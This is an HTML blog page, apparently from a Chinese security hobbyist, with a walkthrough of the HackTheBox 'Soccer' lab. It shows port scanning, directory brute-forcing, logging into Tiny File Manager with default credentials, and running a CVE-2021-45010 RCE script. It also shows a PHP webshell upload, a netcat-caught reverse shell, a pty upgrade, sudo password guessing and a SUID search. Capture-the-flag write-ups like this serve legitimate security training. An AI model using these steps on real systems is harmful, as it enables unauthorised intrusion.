@@ -1,0 +1,752 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Soccer 靶机信息收集12345678910111213┌──(i3eg1nner㉿minilite)-[~&#x2F;Downloads&#x2F;Soccer]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.194Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-06 09:22 EDTWarning: 10.10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Soccer靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/3f1f96829489.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Soccer 靶机信息收集12345678910111213┌──(i3eg1nner㉿minilite)-[~&#x2F;Downloads&#x2F;Soccer]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.194Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-06 09:22 EDTWarning: 10.10.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e3dd28b2f4b32c6bdd797566236e985d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/492d3904bfa8b4d484a896efc6e798ee_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4460a8360d4c92287d3442feeada7e69_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3b9cb9626088c227b2d1d41d3d28fafd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f45be2a36a8d465750935cd8f176c063_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/82d4bfbf0ae750cad90a38c54b2e8d05_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/67a5c492fad96115ec4f5aea1a694a0a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/341c5ba41865757ceada48c03c1b6fb6_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/30e78b06c05d661518dc700c83677507_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/77f91baf36876bbf458d06de1ecbb166_MD5.png">
+<meta property="article:published_time" content="2023-06-07T05:51:45.000Z">
+<meta property="article:modified_time" content="2023-07-04T08:37:16.125Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/e3dd28b2f4b32c6bdd797566236e985d_MD5.png">
+  
+  
+  
+  <title>Soccer靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Soccer靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-07 13:51" pubdate>
+          2023年6月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          143 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Soccer靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Soccer-靶机"><a href="#Soccer-靶机" class="headerlink" title="Soccer 靶机"></a>Soccer 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.194<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:22 EDT<br>Warning: 10.10.11.194 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.194<br>Host is up (0.058s latency).<br>Not shown: 64759 closed tcp ports (reset), 773 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9091/tcp open  xmltec-xmlmail<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.92 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap -sT -sV -sC -p22,80,9091  10.10.11.194<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.194<br>Host is up (0.0038s latency).<br><br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)<br>|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)<br>|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)<br>80/tcp   open  http            nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soccer.htb/<br>9091/tcp open  xmltec-xmlmail?<br>| fingerprint-strings:<br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:<br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|   GetRequest:<br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 139<br>|     Date: Tue, 06 Jun 2023 13:24:56 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions, RTSPRequest:<br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Date: Tue, 06 Jun 2023 13:24:56 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.61 seconds<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap --script=vuln -p22,80,9091 10.10.11.194<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> soccer.htb (10.10.11.194)<br>Host is up (0.0039s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-vuln-cve2011-3192:<br>|   VULNERABLE:<br>|   Apache byterange filter DoS<br>|     State: VULNERABLE<br>|     IDs:  BID:49303  CVE:CVE-2011-3192<br>|       The Apache web server is vulnerable to a denial of service attack when numerous<br>|       overlapping byte ranges are requested.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2011-08-19<br>|     References:<br>|       https://seclists.org/fulldisclosure/2011/Aug/175<br>|       https://www.securityfocus.com/bid/49303<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192<br>|_      https://www.tenable.com/plugins/nessus/55976<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">9091/tcp open  xmltec-xmlmail</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 76.65 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>整理一下现在得到的信息：三个开放的端口，大概率 Linux 操作系统，没有明显的漏洞</p>
+<h2 id="Web-界面访问"><a href="#Web-界面访问" class="headerlink" title="Web 界面访问"></a>Web 界面访问</h2><p>访问的时候自动跳转到一个网址 <code>soccer.htb</code>，那我们就在&#x2F;etc&#x2F;hosts 文件中建立映射，这样就能正常访问界面了，查看网页源代码+随意点点点+基础的信息收集，都没得到什么信息。目录爆破吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://soccer.htb<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/06 09:55:03 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]<br>Progress: 219896 / 220561 (99.70%)<br>===============================================================<br>2023/06/06 09:56:35 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<h2 id="Tiny-File-Manager-2-4-3-漏洞"><a href="#Tiny-File-Manager-2-4-3-漏洞" class="headerlink" title="Tiny File Manager 2.4.3 漏洞"></a>Tiny File Manager 2.4.3 漏洞</h2><p>访问一下，是一个叫做 tiny file manager 的文件管理系统，查看网页源代码的时候看到了版本号 <code>2.4.3</code>，谷歌一下</p>
+<p><img src="/pic/e3dd28b2f4b32c6bdd797566236e985d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>GitHub 中得到了两个脚本，sh 脚本跑的时候出了问题，python 脚本能运行但是没有达到预期的效果（网站限制了写权限的问题）。值得注意的是，使用说明中提到了需要管理员的账户和密码，给的例子里的账户名和密码是默认用户和密码，尝试之后发现确实是默认密码登录。使用脚本跑的时候有如下报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ python tiny_file_manager_exploit.py  http://soccer.htb/tiny/tinyfilemanager.php admin <span class="hljs-string">&quot;admin@123&quot;</span><br><br><br>CVE-2021-45010: Tiny File Manager &lt;= 2.4.3 Authenticated RCE  Exploit.<br><br>Vulnerability discovered by Febin<br><br>Exploit Author: FEBIN<br><br>[+] Leak <span class="hljs-keyword">in</span> the webroot direcory path to upload shell.<br>[+] WEBROOT found:  /var/www/html/tiny<br>[+] Trying to upload pwn_1480535420723339776.php to /var/www/html/tiny directory...<br>&#123;<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>:<span class="hljs-string">&quot;The specified folder for upload isn&#x27;t writeable.&quot;</span>&#125;<br>[-] No Success response. Files does not seem to be uploaded successfully.<br>Exiting...<br>Exited.<br><br></code></pre></td></tr></table></figure>
+
+<p>观察地址结构似乎没什么问题，看了脚本里上传文件的内容是一句话木马，那就手动上传试试吧，上传提示 tiny 目录没有上传权限，那就试试下一级 upload 目录，上传成功</p>
+<p><img src="/pic/492d3904bfa8b4d484a896efc6e798ee_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>soccer.htb<span class="hljs-regexp">/tiny/u</span>ploads/&lt;your-shell-name&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>提前开启监听端口，访问以上路径，即可反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nc -lvnp 1234<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>listening on [any] 1234 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.194] 34534<br>Linux soccer 5.4.0-135-generic <span class="hljs-comment">#152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br> 15:41:04 up  4:06,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.02, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:50:56:b9:5e:b1 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 10.10.11.194/23 brd 10.10.11.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::250:56ff:feb9:5eb1/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">$ which python2</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@soccer:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: admin@123</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: 12345</span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br></code></pre></td></tr></table></figure>
+
+<p>进行信息收集，在&#x2F;home&#x2F;player 目录下发现了 user.txt 但是没有访问权限，定时任务、用户目录、环境变量，ps中都没有可以利用的点，s 权限中发现一个特殊文件doas</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/local/bin/doas<br>/usr/lib/snapd/snap-confine<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/umount<br>/usr/bin/fusermount<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/chsh<br>/usr/bin/at<br>/snap/snapd/17883/usr/lib/snapd/snap-confine<br>/snap/core20/1695/usr/bin/chfn<br>/snap/core20/1695/usr/bin/chsh<br>/snap/core20/1695/usr/bin/gpasswd<br>/snap/core20/1695/usr/bin/mount<br>/snap/core20/1695/usr/bin/newgrp<br>/snap/core20/1695/usr/bin/passwd<br>/snap/core20/1695/usr/bin/su<br>/snap/core20/1695/usr/bin/sudo<br>/snap/core20/1695/usr/bin/umount<br>/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1695/usr/lib/openssh/ssh-keysign<br><br></code></pre></td></tr></table></figure>
+
+<p>谷歌发现</p>
+<p><img src="/pic/4460a8360d4c92287d3442feeada7e69_MD5.png" srcset="/img/loading.gif" lazyload></p>
